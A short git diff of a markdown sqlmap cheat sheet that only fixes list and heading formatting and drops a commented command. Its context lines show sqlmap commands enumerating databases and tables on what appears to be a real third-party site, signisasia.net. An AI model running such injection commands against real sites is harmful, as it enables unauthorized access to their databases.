@@ -10,9 +10,8 @@ sqlmap -u http://signisasia.net/books/view?id=1 --dbs
 
 __Request in File___
 
--Capture the request with httpheader,burpsuite
--Save it to req.txt
-#sqlmap -r req.txt -p username
+- Capture the request with httpheader,burpsuite
+- Save it to req.txt
 ```console
 sqlmap -r request.txt
 ```
@@ -85,7 +84,7 @@ sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database -T table_name
 
 
 
-##Speeding Up The process
+## Speeding Up The process
 
 __Multithreading__
 ```console
